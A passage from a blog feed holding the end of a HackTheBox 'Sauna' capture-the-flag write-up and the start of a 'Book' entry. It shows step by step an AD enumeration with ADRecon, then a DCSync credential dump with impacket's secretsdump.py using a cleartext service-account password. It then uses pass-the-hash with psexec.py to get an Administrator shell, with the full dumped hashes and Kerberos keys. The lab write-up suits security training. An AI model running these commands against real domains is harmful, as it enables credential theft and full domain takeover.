+&lt;span class="code-line"&gt;Cannot find a variable with the name &amp;#39;computerrole&amp;#39;.&lt;/span&gt;
+&lt;span class="code-line"&gt;At C:\Users\svc_loanmgr\Documents\ADRecon.ps1:11292 char:5&lt;/span&gt;
+&lt;span class="code-line"&gt;+     Remove-Variable computerrole&lt;/span&gt;
+&lt;span class="code-line"&gt;+     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~&lt;/span&gt;
+&lt;span class="code-line"&gt;    + CategoryInfo          : ObjectNotFound: (computerrole:String) [Remove-Variable], ItemNotFoundException&lt;/span&gt;
+&lt;span class="code-line"&gt;    + FullyQualifiedErrorId : VariableNotFound,Microsoft.PowerShell.Commands.RemoveVariableCommand&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Running on \SAUNA -&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Commencing - 02/19/2020 15:41:03&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Domain&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Forest&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Trusts&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Sites&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Subnets&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Default Password Policy&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Fine Grained Password Policy - May need a Privileged Account&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Domain Controllers&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Users - May take some time&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] User SPNs&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] PasswordAttributes - Experimental&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Groups - May take some time&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Group Memberships - May take some time&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] OrganizationalUnits (OUs)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] GPOs&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] gPLinks - Scope of Management (SOM)&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] DNS Zones and Records&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Printers&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Computers - May take some time&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] Computer SPNs&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] LAPS - Needs Privileged Account&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: [*] LAPS is not implemented.&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] BitLocker Recovery Keys - Needs Privileged Account&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] ACLs - May take some time&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: [*] SACLs - Currently, the module is only supported with LDAP.&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] GPOReport - May take some time&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Total Execution Time (mins): 0.69&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Output Directory: C:\Users\svc_loanmgr\Documents\ADRecon-Report-20200219154103&lt;/span&gt;
+&lt;span class="code-line"&gt;Warning: [Get-ADRExcelComObj] Excel does not appear to be installed. Skipping generation of ADRecon-Report.xlsx. Use the -GenExcel parameter to generate the ADRecon-Report.xslx on a host with Microsoft Excel installed.&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents&amp;gt; download ADRecon-Report-20200219154103 /tmp/adrecon&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Downloading ADRecon-Report-20200219154103 to /tmp/adrecon&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Download successful!&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We look at our user permissions and found that it has the AD privilege
+&lt;a href="https://docs.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes"&gt;DS-Replication-Get-Changes&lt;/a&gt;
+which allows to replicate changes from a given NC.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;grep svc CSV-Files/*&lt;/span&gt;
+&lt;span class="code-line"&gt;CSV-Files/AboutADRecon.csv:&amp;quot;Ran as user&amp;quot;,&amp;quot;svc_loanmgr&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;CSV-Files/DACLs.csv:&amp;quot;EGOTISTICAL-BANK&amp;quot;,&amp;quot;Domain&amp;quot;,&amp;quot;All&amp;quot;,&amp;quot;All&amp;quot;,&amp;quot;ReadProperty, GenericExecute&amp;quot;,&amp;quot;Allow&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;Administrators&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;00000000-0000-0000-0000-000000000000&amp;quot;,&amp;quot;00000000-0000-0000-0000-000000000000&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;S-1-5-32-544&amp;quot;,&amp;quot;DC=EGOTISTICAL-BANK,DC=LOCAL&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;CSV-Files/DACLs.csv:&amp;quot;EGOTISTICAL-BANK&amp;quot;,&amp;quot;Domain&amp;quot;,&amp;quot;DS-Replication-Get-Changes&amp;quot;,&amp;quot;All&amp;quot;,&amp;quot;ExtendedRight&amp;quot;,&amp;quot;Allow&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;Administrators&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;ObjectAceTypePresent&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2&amp;quot;,&amp;quot;00000000-0000-0000-0000-000000000000&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;S-1-5-32-544&amp;quot;,&amp;quot;DC=EGOTISTICAL-BANK,DC=LOCAL&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;CSV-Files/DACLs.csv:&amp;quot;EGOTISTICAL-BANK&amp;quot;,&amp;quot;Domain&amp;quot;,&amp;quot;DS-Replication-Get-Changes-All&amp;quot;,&amp;quot;All&amp;quot;,&amp;quot;ExtendedRight&amp;quot;,&amp;quot;Allow&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;Administrators&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;ObjectAceTypePresent&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;None&amp;quot;,&amp;quot;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2&amp;quot;,&amp;quot;00000000-0000-0000-0000-000000000000&amp;quot;,&amp;quot;EGOTISTICALBANK\svc_loanmgr&amp;quot;,&amp;quot;S-1-5-32-544&amp;quot;,&amp;quot;DC=EGOTISTICAL-BANK,DC=LOCAL&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;CSV-Files/GroupMembers.csv:&amp;quot;Domain Users&amp;quot;,&amp;quot;svc_loanmgr&amp;quot;,&amp;quot;L Manager&amp;quot;,&amp;quot;user&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;CSV-Files/GroupMembers.csv:&amp;quot;Remote Management Users&amp;quot;,&amp;quot;svc_loanmgr&amp;quot;,&amp;quot;L Manager&amp;quot;,&amp;quot;user&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;CSV-Files/Users.csv:&amp;quot;svc_loanmgr&amp;quot;,&amp;quot;L Manager&amp;quot;,&amp;quot;True&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;True&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;True&amp;quot;,&amp;quot;False&amp;quot;,,,,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;0&amp;quot;,&amp;quot;25&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,&amp;quot;False&amp;quot;,,,,,,&amp;quot;513&amp;quot;,&amp;quot;S-1-5-21-2966785786-3096785034-1186376766-1108&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;2/19/2020 3:39:15 PM&amp;quot;,&amp;quot;1/24/2020 3:48:31 PM&amp;quot;,,,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,,,,&amp;quot;66048&amp;quot;,&amp;quot;L&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;Manager&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;1/24/2020 3:48:31 PM&amp;quot;,&amp;quot;2/19/2020 3:39:15 PM&amp;quot;,&amp;quot;CN=L Manager,CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL&amp;quot;,&amp;quot;EGOTISTICAL-BANK.LOCAL/Users/&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="dcsync"&gt;DCSync&lt;/h2&gt;
+&lt;p&gt;This extended privilege allow us to &lt;a href="https://adsecurity.org/?p=1729"&gt;run DCSync attack&lt;/a&gt;.
+For that we use
+&lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's secretdump.py&lt;/a&gt; to get
+the users' passwords hashes and mostly the &lt;code&gt;administrator&lt;/code&gt;'s password hash.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python secretsdump.py &amp;#39;egotisticalbank.local/svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175&amp;#39;&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Using the DRSUAPI method to get NTDS.DIT secrets&lt;/span&gt;
+&lt;span class="code-line"&gt;Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::&lt;/span&gt;
+&lt;span class="code-line"&gt;Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&lt;/span&gt;
+&lt;span class="code-line"&gt;krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::&lt;/span&gt;
+&lt;span class="code-line"&gt;SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b:::&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Kerberos keys grabbed&lt;/span&gt;
+&lt;span class="code-line"&gt;Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031&lt;/span&gt;
+&lt;span class="code-line"&gt;Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0&lt;/span&gt;
+&lt;span class="code-line"&gt;Administrator:des-cbc-md5:19d5f15d689b1ce5&lt;/span&gt;
+&lt;span class="code-line"&gt;krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24&lt;/span&gt;
+&lt;span class="code-line"&gt;krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9&lt;/span&gt;
+&lt;span class="code-line"&gt;krbtgt:des-cbc-md5:c170d5dc3edfc1d9&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c&lt;/span&gt;
+&lt;span class="code-line"&gt;EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2&lt;/span&gt;
+&lt;span class="code-line"&gt;SAUNA$:aes256-cts-hmac-sha1-96:a90968c91de5f77ac3b7d938bd760002373f71e14e1a027b2d93d1934d64754a&lt;/span&gt;
+&lt;span class="code-line"&gt;SAUNA$:aes128-cts-hmac-sha1-96:0bf0c486c1262ab6cf46b16dc3b1b198&lt;/span&gt;
+&lt;span class="code-line"&gt;SAUNA$:des-cbc-md5:b989ecc101ae4ca1&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Cleaning up...&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h2 id="pth"&gt;PTH&lt;/h2&gt;
+&lt;p&gt;We can then use the &lt;a href="http://blog.gentilkiwi.com/tag/pass-the-hash"&gt;Path the hash&lt;/a&gt;
+technique with
+&lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's psexec.py&lt;/a&gt; to login as
+Administrator on the Domain Controller as administrator and get the flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python psexec.py egotisticalbank.local/Administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Requesting shares on 10.10.10.175.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Found writable share ADMIN$&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Uploading file NEOSMAXA.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Opening SVCManager on 10.10.10.175.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Creating service RFiq on 10.10.10.175.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Starting service RFiq.....&lt;/span&gt;
+&lt;span class="code-line"&gt;[!] Press help for extra shell commands&lt;/span&gt;
+&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.17763.973]&lt;/span&gt;
+&lt;span class="code-line"&gt;(c) 2018 Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Windows\system32&amp;gt;type C:\Users\Administrator\Desktop\root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;f3ee04965c68257382e31502cc5e881f&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This box is a lot like &lt;a href="todo link if article already published"&gt;Forest&lt;/a&gt; and I
+am a bit disappointed. Apart from that the box is interesting. &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;What a journey. This box was classified as easy but probably needed a medium
+classification. WinRM is so &lt;em&gt;finicky&lt;/em&gt;. The root part was interesting as it
+allowed us to play with AD privileges which doesn't happen a lot
+outside of client environments.
+(Conclustion of &lt;a href="TODO link"&gt;Forest&lt;/a&gt;)&lt;/p&gt;
+&lt;/blockquote&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Windows"></category><category term="impacket"></category><category term="enumeration"></category></entry><entry><title>HTB: Book</title><link href="https://maggick.fr/2020/07/htb-book.html" rel="alternate"></link><published>2020-07-12T16:30:00+02:00</published><updated>2020-07-12T16:30:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-07-12:/2020/07/htb-book.html</id><summary type="html">&lt;p&gt;&lt;img alt="Book card" class="align-left" src="/media/2020.07/book_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/230"&gt;Book&lt;/a&gt;
 This box is classified as a medium machine published on February the 22th 2020
